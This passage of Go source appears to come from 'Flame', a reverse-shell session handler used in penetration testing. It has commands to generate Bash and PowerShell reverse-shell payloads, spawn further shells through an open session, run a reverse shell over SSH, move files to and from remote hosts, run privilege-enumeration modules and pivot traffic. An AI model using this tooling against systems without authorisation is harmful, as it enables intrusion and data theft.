	if sessionCount > 0 {
		m.showMenu()
	} else {
		fmt.Println(ui.Info("No active sessions"))
	}

	return err
}

// StartMenu inicia o loop do menu principal
func (m *Manager) StartMenu() {
	// Setup readline with history
	historyFile := appDataPath("history")

	// Create flame data directory if it doesn't exist
	os.MkdirAll(appDataPath(), 0755)

	// Create completer
	completer := &FlameCompleter{manager: m}

	rl, err := readline.NewEx(&readline.Config{
		HistoryFile:            historyFile,
		HistoryLimit:           1000,
		DisableAutoSaveHistory: false,
		InterruptPrompt:        "^C",
		EOFPrompt:              "",
		HistorySearchFold:      true,
		AutoComplete:           completer,
	})
	if err != nil {
		fmt.Printf("Warning: readline init failed, using basic input: %v\n", err)
		m.startMenuBasic()
		return
	}
	defer rl.Close()

	for {
		// Só mostra prompt e lê se estivermos no menu
		if m.menuActive {
			// Show appropriate prompt based on selected session
			if m.selectedSession != nil {
				rl.SetPrompt(ui.PromptWithSession(m.selectedSession.NumID))
			} else {
				rl.SetPrompt(ui.Prompt())
			}

			line, err := rl.Readline()
			if err != nil {
				if err == readline.ErrInterrupt {
					// Ctrl+C is disabled - use 'exit', 'quit', or 'q' to exit
					continue
				} else if err == io.EOF {
					// Ignore EOF completely (Ctrl+D, Delete key, etc)
					// Only exit via "exit", "quit", or "q" commands
					continue
				}
				break
			}

			command := strings.TrimSpace(line)
			if command == "" {
				continue
			}

			m.handleCommand(command)
		}
	}
}

// startMenuBasic is a fallback for when readline fails
func (m *Manager) startMenuBasic() {
	for {
		if m.menuActive {
			if m.selectedSession != nil {
				fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
			} else {
				fmt.Print(ui.Prompt())
			}

			var command string
			fmt.Scanln(&command)
			command = strings.TrimSpace(command)
			if command == "" {
				continue
			}

			m.handleCommand(command)
		}
	}
}

// handleCommand processa comandos do menu
func (m *Manager) handleCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "help", "h":
		m.showHelp()
	case "spawn":
		m.handleSpawn()
	case "ssh":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: ssh user@host"))
			return
		}
		m.handleSSH(parts[1])
	case "rev":
		// Optional: rev [ip] [port]
		ip := GlobalRuntimeConfig.GetPivotIP()
		port := m.listenerPort

		if len(parts) >= 2 {
			ip = parts[1]
		}
		if len(parts) >= 3 {
			customPort, err := strconv.Atoi(parts[2])
			if err != nil {
				fmt.Println(ui.Error(fmt.Sprintf("Invalid port: %s", parts[2])))
				return
			}
			port = customPort
		}

		m.handleRev(ip, port)
	case "sessions", "list", "ls":
		m.ListSessions()
	case "use":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: use <session_id>"))
			return
		}
		numID, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
			return
		}
		err = m.UseSession(numID)
		if err != nil {
			fmt.Println(ui.Error(err.Error()))
		}
	case "shell":
		err := m.ShellSession()
		if err != nil && err != io.EOF {
			fmt.Println(ui.Error(err.Error()))
		}
	case "kill":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: kill <session_id>"))
			return
		}
		numID, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
			return
		}
		err = m.KillSession(numID)
		if err != nil {
			fmt.Println(ui.Error(err.Error()))
		}
	case "exit", "quit", "q":
		// Check if there are active sessions
		m.mu.RLock()
		hasActiveSessions := len(m.sessions) > 0
		m.mu.RUnlock()

		if hasActiveSessions {
			// Prompt for confirmation
			if !ui.Confirm("Active sessions detected. Exit anyway?") {
				// fmt.Println(ui.Info("Exit cancelled"))
				return
			}
		}

		// Stop HTTP server if running
		if GlobalRuntimeConfig.BinbagEnabled {
			GlobalRuntimeConfig.DisableBinbag()
		}

		fmt.Println(ui.Success("Goodbye!"))
		os.Exit(0)
	case "clear", "cls":
		fmt.Print("\033[2J\033[H")
	case "upload":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: upload <local_path> [remote_path]"))
			return
		}
		remotePath := ""
		if len(parts) >= 3 {
			remotePath = parts[2]
		}
		m.handleUpload(parts[1], remotePath)
	case "download":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: download <remote_path> [local_path]"))
			return
		}
		localPath := ""
		if len(parts) >= 3 {
			localPath = parts[2]
		}
		m.handleDownload(parts[1], localPath)
	case "modules":
		m.handleModulesList()
	case "run":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: run <module> [args...]"))
			fmt.Println(ui.Info("Type 'modules' to see available modules"))
			return
		}
		m.handleRunModule(parts[1], parts[2:])
	case "config":
		m.handleShowConfig()
	case "binbag":
		m.handleBinbag(parts[1:])
	case "pivot":
		m.handlePivot(parts[1:])
	default:
		fmt.Println(ui.Warning(fmt.Sprintf("Unknown command: %s (type 'help' for available commands)", parts[0])))
	}
}

// showMenu mostra o menu principal com sessões ativas
func (m *Manager) showMenu() {
	m.ListSessions()
}

// showHelp mostra ajuda dos comandos
func (m *Manager) showHelp() {
	// Collect all help lines with categories
	var lines []string

	// Connect category
	lines = append(lines, ui.CommandHelp("connect"))
	lines = append(lines, ui.Command("rev [ip] [port]              - Generate reverse shell payloads"))
	lines = append(lines, ui.Command("ssh user@host                - Connect via SSH and execute revshell"))
	lines = append(lines, "")

	// Handler category
	lines = append(lines, ui.CommandHelp("handler"))
	lines = append(lines, ui.Command("sessions, list               - List active sessions"))
	lines = append(lines, ui.Command("use <id>                     - Select session with given ID"))
	lines = append(lines, ui.Command("kill <id>                    - Kill session with given ID"))
	lines = append(lines, "")

	// Session category
	lines = append(lines, ui.CommandHelp("session"))
	lines = append(lines, ui.Command("shell                        - Enter interactive shell"))
	lines = append(lines, ui.Command("upload <local> [remote]      - Upload file to remote system"))
	lines = append(lines, ui.Command("download <remote> [local]    - Download file from remote system"))
	lines = append(lines, ui.Command("spawn                        - Spawn new shell from active session"))
	lines = append(lines, "")

	// Modules category
	lines = append(lines, ui.CommandHelp("modules"))
	lines = append(lines, ui.Command("modules                      - List available modules"))
	lines = append(lines, ui.Command("run <module> [args]          - Run a module (e.g., run peas, run lse, run elf)"))
	lines = append(lines, "")

	// Binbag category
	lines = append(lines, ui.CommandHelp("binbag"))
	lines = append(lines, ui.Command("binbag ls                    - List binbag files"))
	lines = append(lines, ui.Command("binbag on/off                - Enable/disable binbag HTTP server"))
	lines = append(lines, ui.Command("binbag path <dir>            - Set binbag directory"))
	lines = append(lines, ui.Command("binbag port <N>              - Set HTTP server port"))
	lines = append(lines, "")

	// Pivot category
	lines = append(lines, ui.CommandHelp("pivot"))
	lines = append(lines, ui.Command("pivot <ip>                   - Route all URLs/payloads through pivot IP"))
	lines = append(lines, ui.Command("pivot off                    - Disable pivot"))
	lines = append(lines, "")

	// Program category
	lines = append(lines, ui.CommandHelp("program"))
	lines = append(lines, ui.Command("config                       - Show current configuration"))
	lines = append(lines, ui.Command("help                         - Show this help"))
	lines = append(lines, ui.Command("clear                        - Clear screen"))
	lines = append(lines, ui.Command("exit, quit                   - Exit Flame"))

	// Render everything inside a box
	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Available Commands", ui.SymbolGem), lines))
}

// GetSessionCount retorna o número de sessões ativas (exclui workers)
func (m *Manager) GetSessionCount() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	count := 0
	for _, s := range m.sessions {
		if !s.isWorker {
			count++
		}
	}
	return count
}

// getAllSessionCount returns total sessions including workers (for spawn detection)
func (m *Manager) getAllSessionCount() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions)
}

// GetSessionLogDir returns the sessions directory if THIS instance created logs.
func (m *Manager) GetSessionLogDir() string {
	m.mu.RLock()
	hasLogs := m.hasCreatedLogs
	m.mu.RUnlock()
	if !hasLogs {
		return ""
	}
	if _, err := os.UserHomeDir(); err != nil {
		return ""
	}
	return appDataPath("sessions")
}

// HasActiveSessions returns true if there are any active sessions
func (m *Manager) HasActiveSessions() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions) > 0
}

// GetAllSessions retorna todas as sessões ativas ordenadas por NumID
func (m *Manager) GetAllSessions() []*SessionInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	sessions := make([]*SessionInfo, 0, len(m.sessions))
	for _, session := range m.sessions {
		sessions = append(sessions, session)
	}

	// Sort by NumID
	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].NumID < sessions[j].NumID
	})

	return sessions
}

// flushStdin limpa o buffer stdin para evitar comandos residuais
func (m *Manager) flushStdin() {
	if !term.IsTerminal(int(os.Stdin.Fd())) {
		return
	}

	// Pequena pausa para garantir que dados residuais chegaram
	time.Sleep(10 * time.Millisecond)

	// Flush usando syscall
	syscall.Syscall(syscall.SYS_IOCTL, uintptr(os.Stdin.Fd()), uintptr(0x540B), 0) // TCFLSH
}

// handleUpload handles file upload command
func (m *Manager) handleUpload(localPath, remotePath string) {
	// Check if there's a selected session
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Create transferer
	t := NewTransferer(m.selectedSession.Conn, m.selectedSession.ID)
	t.SetPlatform(m.selectedSession.Platform)

	// Create context with cancel for Ctrl+D handling
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start watching for Ctrl+D in background
	WatchForCancel(ctx, cancel)

	// Show hint
	fmt.Println(ui.CommandHelp("Press Ctrl+D to cancel"))

	// Always use SmartUpload (handles local, binbag, URL, with b64 fallback)
	err := t.SmartUpload(ctx, localPath, remotePath)

	if err != nil {
		// Check if it was cancelled by user
		if ctx.Err() == context.Canceled {
			fmt.Println(ui.Warning("Upload cancelled by user"))
		} else {
			fmt.Println(ui.Error(fmt.Sprintf("Upload failed: %v", err)))
		}
		return
	}

	// Note: WatchForCancel goroutine will consume first character typed after upload
	// This is a known limitation - trade-off for having Ctrl+D cancel support
}

// handleDownload handles file download command
func (m *Manager) handleDownload(remotePath, localPath string) {
	// Check if there's a selected session
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Create transferer
	t := NewTransferer(m.selectedSession.Conn, m.selectedSession.ID)
	t.SetPlatform(m.selectedSession.Platform)

	// Create context with cancel for Ctrl+D handling
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start watching for Ctrl+D in background
	WatchForCancel(ctx, cancel)

	// Show hint
	fmt.Println(ui.CommandHelp("Press Ctrl+D to cancel"))

	// Perform download (HTTP POST if binbag enabled, b64 fallback)
	err := t.SmartDownload(ctx, remotePath, localPath)
	if err != nil {
		// Check if it was cancelled by user
		if ctx.Err() == context.Canceled {
			fmt.Println(ui.Warning("Download cancelled by user"))
		} else {
			fmt.Println(ui.Error(fmt.Sprintf("Download failed: %v", err)))
		}
		return
	}

	// Note: WatchForCancel goroutine will consume first character typed after download
	// This is a known limitation - trade-off for having Ctrl+D cancel support
}

// StartUpload runs an upload asynchronously with TUI spinner progress.
// Completion is reported via transferDoneFunc callback (non-blocking).
func (m *Manager) StartUpload(ctx context.Context, localPath, remotePath string) {
	m.mu.RLock()
	session := m.selectedSession
	m.mu.RUnlock()

	filename := filepath.Base(localPath)

	if session == nil {
		if m.transferDoneFunc != nil {
			m.transferDoneFunc(filename, true, fmt.Errorf("No session selected"))
		}
		return
	}

	spinID := m.startSpinner(fmt.Sprintf("Uploading %s...", filename))

	go func() {
		// Stop relay for exclusive conn access during transfer
		wasRelaying := session.relayActive
		if wasRelaying {
			m.StopShellRelay()
			time.Sleep(600 * time.Millisecond)
		}
		defer func() {
			if wasRelaying {
				m.StartShellRelay(0, 0)
			}
		}()

		// Disable PTY echo to prevent backpressure (echo fills TCP buffers)
		if session.Handler != nil && session.Handler.IsPTYUpgraded() {
			session.Conn.Write([]byte("stty -echo\n"))
			time.Sleep(100 * time.Millisecond)
		}
		defer func() {
			if session.Handler != nil && session.Handler.IsPTYUpgraded() {
				session.Conn.Write([]byte("stty echo\n"))
				time.Sleep(100 * time.Millisecond)
			}
		}()

		t := NewTransferer(session.Conn, session.ID)
		t.SetPlatform(session.Platform)
		t.ptyUpgraded = wasRelaying && session.Handler != nil && session.Handler.IsPTYUpgraded()
		t.progressFn = func(text string) {
			if m.spinnerUpdate != nil {
				m.spinnerUpdate(spinID, text)
			}
			if m.transferProgressFunc != nil {
				if pct := extractPercent(text); pct >= 0 {
					m.transferProgressFunc(filename, pct, "", true)
				}
			}
		}

		// Always use SmartUpload (handles local, binbag, URL, with b64 fallback)
		err := t.SmartUpload(ctx, localPath, remotePath)
		m.stopSpinner(spinID)
		if m.transferDoneFunc != nil {
			m.transferDoneFunc(filename, true, err)
		}
	}()
}

// StartDownload runs a download asynchronously with TUI spinner progress.
// Completion is reported via transferDoneFunc callback (non-blocking).
func (m *Manager) StartDownload(ctx context.Context, remotePath, localPath string) {
	m.mu.RLock()
	session := m.selectedSession
	m.mu.RUnlock()

	filename := filepath.Base(remotePath)

	if session == nil {
		if m.transferDoneFunc != nil {
			m.transferDoneFunc(filename, false, fmt.Errorf("No session selected"))
		}
		return
	}

	spinID := m.startSpinner(fmt.Sprintf("Downloading %s...", filename))

	go func() {
		if m.transferProgressFunc != nil {
			m.transferProgressFunc(filename, 0, "0 B", false)
		}
		// Download needs exclusive read access (marker-based protocol).
		// Stop relay, download, restart relay.
		wasRelaying := session.relayActive
		if wasRelaying {
			m.StopShellRelay()
			time.Sleep(600 * time.Millisecond) // wait for relay goroutine to exit
		}
		defer func() {
			if wasRelaying {
				m.StartShellRelay(0, 0)
			}
		}()

		// Disable PTY echo to prevent backpressure
		if session.Handler != nil && session.Handler.IsPTYUpgraded() {
			session.Conn.Write([]byte("stty -echo\n"))
			time.Sleep(100 * time.Millisecond)
		}
		defer func() {
			if session.Handler != nil && session.Handler.IsPTYUpgraded() {
				session.Conn.Write([]byte("stty echo\n"))
				time.Sleep(100 * time.Millisecond)
			}
		}()

		t := NewTransferer(session.Conn, session.ID)
		t.SetPlatform(session.Platform)
		t.ptyUpgraded = wasRelaying && session.Handler != nil && session.Handler.IsPTYUpgraded()
		t.progressFn = func(text string) {
			if m.spinnerUpdate != nil {
				m.spinnerUpdate(spinID, text)
			}
			if m.transferProgressFunc != nil {
				sizeStr := ""
				if idx := strings.LastIndex(text, "... "); idx >= 0 {
					sizeStr = text[idx+4:]
				}
				m.transferProgressFunc(filename, 0, sizeStr, false)
			}
		}

		err := t.SmartDownload(ctx, remotePath, localPath)
		m.stopSpinner(spinID)
		if m.transferDoneFunc != nil {
			m.transferDoneFunc(filename, false, err)
		}
	}()
}

// handleRev generates and displays reverse shell payloads
func (m *Manager) handleRev(ip string, port int) {
	// Validate that we have IP and port
	if ip == "" {
		fmt.Println(ui.Error("No IP address available. Please specify IP with: rev <ip> <port>"))
		return
	}
	if port == 0 {
		fmt.Println(ui.Error("No port available. Please specify port with: rev <ip> <port>"))
		return
	}

	// Create payload generator
	gen := NewReverseShellGenerator(ip, port)

	// Bash payloads
	fmt.Println(ui.CommandHelp("Bash"))
	fmt.Println(gen.GenerateBash())
	fmt.Println(gen.GenerateBashBase64())
	// PowerShell payload
	fmt.Println(ui.CommandHelp("PowerShell"))
	fmt.Println(gen.GeneratePowerShell())
}

// handleSpawn spawns a new reverse shell from the currently selected session (CLI mode)
func (m *Manager) handleSpawn() {
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}
	m.StartSpawn()
	// In CLI mode, just print immediately (TUI uses async callback)
	fmt.Println(ui.Info("Spawn payload sent — waiting for connection..."))
}

// StartSpawn sends a spawn payload asynchronously. Uses TUI spinner + notification.
func (m *Manager) StartSpawn() {
	m.mu.RLock()
	session := m.selectedSession
	m.mu.RUnlock()

	if session == nil {
		if m.transferDoneFunc != nil {
			m.transferDoneFunc("spawn", false, fmt.Errorf("No session selected"))
		}
		return
	}

	spawnIP := GlobalRuntimeConfig.GetPivotIP()
	if spawnIP == "" || m.listenerPort == 0 {
		if m.transferDoneFunc != nil {
			m.transferDoneFunc("spawn", false, fmt.Errorf("No listener IP/port available"))
		}
		return
	}

	platform := session.Platform
	if platform == "detecting..." || platform == "unknown" {
		platform = "linux"
	}

	// Generate payload using shared generator
	gen := NewReverseShellGenerator(spawnIP, m.listenerPort)
	var payload string
	switch platform {
	case "linux", "macos":
		payload = gen.GenerateBash() + "\n"
	case "windows":
		payload = gen.GeneratePowerShellDetached() + "\n"
	default:
		if m.transferDoneFunc != nil {
			m.transferDoneFunc("spawn", false, fmt.Errorf("Unsupported platform: %s", platform))
		}
		return
	}

	spinID := m.startSpinner(fmt.Sprintf("Spawning %s reverse shell...", platform))
	initialCount := m.GetSessionCount()

	go func() {
		// Suppress all output for the next 2s (stty + payload + stty echo + prompts)
		if session.relayActive {
			m.relaySuppressNano.Store(time.Now().Add(2 * time.Second).UnixNano())
		}

		// Disable echo, send payload, restore echo
		if session.relayActive && session.Handler != nil && session.Handler.IsPTYUpgraded() {
			session.Conn.Write([]byte("stty -echo\n"))
			time.Sleep(100 * time.Millisecond)
		}

		_, err := session.Conn.Write([]byte(payload))
		if err != nil {
			m.stopSpinner(spinID)
			if m.transferDoneFunc != nil {
				m.transferDoneFunc("spawn", false, fmt.Errorf("Failed to send: %v", err))
			}
			return
		}

		if session.relayActive && session.Handler != nil && session.Handler.IsPTYUpgraded() {
			time.Sleep(100 * time.Millisecond)
			session.Conn.Write([]byte("stty echo\n"))
		}

		// Wait up to 5s for new session to arrive
		for i := 0; i < 25; i++ {
			time.Sleep(200 * time.Millisecond)
			if m.GetSessionCount() > initialCount {
				m.stopSpinner(spinID)
				// Session notification handles the rest (fire emoji etc.)
				return
			}
		}

		// Timeout — payload sent but no connection yet
		m.stopSpinner(spinID)
		m.notify(ui.Info("Spawn payload sent — waiting for connection") + "\n")
		m.notifyOverlay("Spawn payload sent — waiting for connection", 0)
	}()
}

// handleSSH connects to a remote host via SSH and executes reverse shell payload
func (m *Manager) handleSSH(target string) {
	// Validate that we have IP and port
	sshIP := GlobalRuntimeConfig.GetPivotIP()
	if sshIP == "" {
		fmt.Println(ui.Error("No listener IP available"))
		return
	}
	if m.listenerPort == 0 {
		fmt.Println(ui.Error("No listener port available"))
		return
	}

	// Create SSH connector
	connector := NewSSHConnector(sshIP, m.listenerPort)

	// Connect silently (only SSH password prompt will show)
	err := connector.ConnectInteractive(target)
	if err != nil {
		fmt.Println(ui.Error(err.Error()))
		return
	}

	// Success - session should appear in list automatically via SessionOpened()
	// No need to print anything here, the notification will appear when session connects
}

// handleShowConfig displays current runtime configuration
func (m *Manager) handleShowConfig() {
	rc := GlobalRuntimeConfig
	rc.mu.RLock()
	defer rc.mu.RUnlock()

	var lines []string

	// Binbag section
	lines = append(lines, ui.CommandHelp("binbag"))
	lines = append(lines, ui.Command(fmt.Sprintf("enabled: %v", rc.BinbagEnabled)))
	if rc.BinbagEnabled {
		lines = append(lines, ui.Command(fmt.Sprintf("path: %s", rc.BinbagPath)))
		lines = append(lines, ui.Command(fmt.Sprintf("http_port: %d", rc.HTTPPort)))
		lines = append(lines, ui.Command(fmt.Sprintf("http_url: http://%s:%d/", rc.ListenerIP, rc.HTTPPort)))
	}
	lines = append(lines, "")

	// Pivot section
	lines = append(lines, ui.CommandHelp("pivot"))
	if rc.PivotEnabled {
		lines = append(lines, ui.Command(fmt.Sprintf("ip: %s", rc.PivotHost)))
	} else {
		lines = append(lines, ui.Command("disabled"))
	}

	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Configuration", ui.SymbolGem), lines))
}

// handleBinbag handles the 'binbag' command and subcommands
func (m *Manager) handleBinbag(args []string) {
	rc := GlobalRuntimeConfig

	// No args or "ls": show status and list files
	if len(args) == 0 || args[0] == "ls" {
		if !rc.BinbagEnabled {
			fmt.Println(ui.Info("Binbag is disabled"))
			return
		}

		fmt.Println(ui.Info(fmt.Sprintf("Listing binbag dir: %s", rc.BinbagPath)))

		// List files
		entries, err := os.ReadDir(rc.BinbagPath)
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Failed to read binbag directory: %v", err)))
			return
		}

		var names []string
		for _, entry := range entries {
			if !entry.IsDir() && !strings.HasPrefix(entry.Name(), "tmp_") {
				names = append(names, entry.Name())
			}
		}

		if len(names) == 0 {
			fmt.Println(ui.Warning("No files in binbag"))
		} else {
			// Multi-column layout (like ls)
			maxLen := 0
			for _, name := range names {
				if len(name) > maxLen {
					maxLen = len(name)
				}
			}
			colWidth := maxLen + 2 // padding between columns
			termWidth := 70        // reasonable default for boxed content
			cols := termWidth / colWidth
			if cols < 1 {
				cols = 1
			}

			var lines []string
			for i := 0; i < len(names); i += cols {
				line := ""
				for j := 0; j < cols && i+j < len(names); j++ {
					line += fmt.Sprintf("%-*s", colWidth, names[i+j])
				}
				lines = append(lines, ui.Command(strings.TrimRight(line, " ")))
			}
			fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Binbag (%d files)", ui.SymbolGem, len(names)), lines))
		}
		return
	}

	switch args[0] {
	case "on":
		path := rc.BinbagPath
		if path == "" {
			fmt.Println(ui.Error("No binbag path configured. Set one first: binbag path <dir>"))
			return
		}
		if err := rc.EnableBinbag(path); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Failed to enable binbag: %v", err)))
			return
		}
		fmt.Println(ui.Success(fmt.Sprintf("Binbag enabled (serving %s on http://%s:%d/)", path, rc.ListenerIP, rc.HTTPPort)))

	case "off":
		if err := rc.DisableBinbag(); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Failed to disable binbag: %v", err)))
			return
		}
		fmt.Println(ui.Success("Binbag disabled"))

	case "path":
		if len(args) < 2 {
			fmt.Println(ui.CommandHelp("Usage: binbag path <dir>"))
			return
		}
		dir := expandUserPath(args[1])
		if err := rc.SetBinbagPath(dir); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Failed to set binbag path: %v", err)))
			return
		}
		fmt.Println(ui.Success(fmt.Sprintf("Binbag path set to: %s", dir)))

	case "port":
		if len(args) < 2 {
			fmt.Println(ui.CommandHelp("Usage: binbag port <N>"))
			return
		}
		port, err := strconv.Atoi(args[1])
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Invalid port: %s", args[1])))
			return
		}
		if err := rc.SetBinbagPort(port); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Failed to set binbag port: %v", err)))
			return
		}
		fmt.Println(ui.Success(fmt.Sprintf("Binbag HTTP port set to: %d", port)))

	default:
		fmt.Println(ui.CommandHelp("Usage: binbag [ls|on|off|path <dir>|port <N>]"))
	}
}

// handlePivot handles the 'pivot' command — sets the pivot IP for all outgoing URLs/payloads
func (m *Manager) handlePivot(args []string) {
	rc := GlobalRuntimeConfig

	if len(args) == 0 {
		if rc.PivotEnabled {
			fmt.Println(ui.Info(fmt.Sprintf("Pivot: %s", rc.PivotHost)))
		} else {
			fmt.Println(ui.Info("Pivot is disabled"))
		}
		return
	}

	if args[0] == "off" {
		if err := rc.DisablePivot(); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Failed to disable pivot: %v", err)))
			return
		}
		fmt.Println(ui.Success("Pivot disabled"))
		return
	}

	// Set pivot IP
	ip := args[0]
	if err := rc.SetPivot(ip); err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Failed to set pivot: %v", err)))
		return
	}
	fmt.Println(ui.Info(fmt.Sprintf("Pivoting via %s — all URLs/payloads will use this IP", ip)))
}

// --- TUI adapter methods ---

// CompleteInput returns the completed input string for the given line and cursor position.
// If there's exactly one match, it returns the completed string.
// If multiple matches, returns the longest common prefix.
// If no matches, returns the original line unchanged.
func (m *Manager) CompleteInput(line string) string {
	completer := &FlameCompleter{manager: m}
	runes := []rune(line)
	matches, replLen := completer.Do(runes, len(runes))

	if len(matches) == 0 {
		return line
	}

	// Single match — apply it
	if len(matches) == 1 {
		prefix := line[:len(line)-replLen]
		return prefix + string(runes[len(runes)-replLen:]) + string(matches[0])
	}

	// Multiple matches — find longest common prefix
	lcp := matches[0]
	for _, m := range matches[1:] {
		i := 0
		for i < len(lcp) && i < len(m) && lcp[i] == m[i] {
			i++
		}
		lcp = lcp[:i]
	}
	if len(lcp) > 0 {
		prefix := line[:len(line)-replLen]
		return prefix + string(runes[len(runes)-replLen:]) + string(lcp)
	}

	return line
}

// ExecuteCommand runs a flame command and returns its text output.
// This captures stdout from the existing handleCommand methods as a Phase 1
// workaround until all output is refactored to return strings.
func (m *Manager) ExecuteCommand(cmd string) string {
	output := captureStdout(func() {
		m.handleCommand(cmd)
	})
	return output
}

// SessionCount returns the number of visible (non-worker) sessions.
func (m *Manager) SessionCount() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	count := 0
	for _, s := range m.sessions {
		if !s.isWorker {
			count++
		}
	}
	return count
}

// GetSessionsForDisplay returns a formatted string of sessions for the TUI sidebar.
func (m *Manager) GetSessionsForDisplay() string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if len(m.sessions) == 0 {
		return "  No sessions"
	}

	var sessions []*SessionInfo
	for _, session := range m.sessions {
		if session.isWorker {
			continue
		}
		sessions = append(sessions, session)
	}
	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].NumID < sessions[j].NumID
	})

	// Colors: brackets=subtle(240), selected num=cyan, unselected num=base(253), arrow=magenta, name=base
	dim := "\033[38;5;240m"  // subtle gray for [ ]
	base := "\033[38;5;253m" // bright white for name and unselected num
	cyan := "\033[36m"       // cyan for selected num
	magenta := "\033[35m"    // magenta for arrow
	reset := "\033[0m"

	var lines []string
	for _, s := range sessions {
		name := s.Whoami
		if name == "" {
			name = s.RemoteIP
		}
		if s == m.selectedSession {
			lines = append(lines, fmt.Sprintf("%s▶%s%s[%s%s%d%s%s]%s %s%s%s",
				magenta, reset, // ▶
				dim, reset, // [
				cyan, s.NumID, reset, // num in cyan
				dim, reset, // ]
				base, name, reset)) // name
		} else {
			lines = append(lines, fmt.Sprintf(" %s[%s%s%d%s%s]%s %s%s%s",
				dim, reset, // [
				base, s.NumID, reset, // num in base
				dim, reset, // ]
				base, name, reset)) // name
		}
	}
	return strings.Join(lines, "\n")
}

// GetSelectedSessionID returns the NumID of the currently selected session.
func (m *Manager) GetSelectedSessionID() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	if m.selectedSession != nil {
		return m.selectedSession.NumID
	}
	return 0
}

// GetActiveSessionDisplay returns display info for the selected session.
func (m *Manager) GetActiveSessionDisplay() (ip, whoami, platform string, ok bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	if m.selectedSession == nil {
		return "", "", "", false
	}
	s := m.selectedSession
	return s.RemoteIP, s.Whoami, s.Platform, true
}

// captureStdout redirects os.Stdout to capture output from legacy fmt.Println calls.
func captureStdout(fn func()) string {
	old := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		fn()
		return ""
	}
	os.Stdout = w

	fn()

	w.Close()
	os.Stdout = old

	var buf bytes.Buffer
	io.Copy(&buf, r)
	r.Close()

	return buf.String()
}
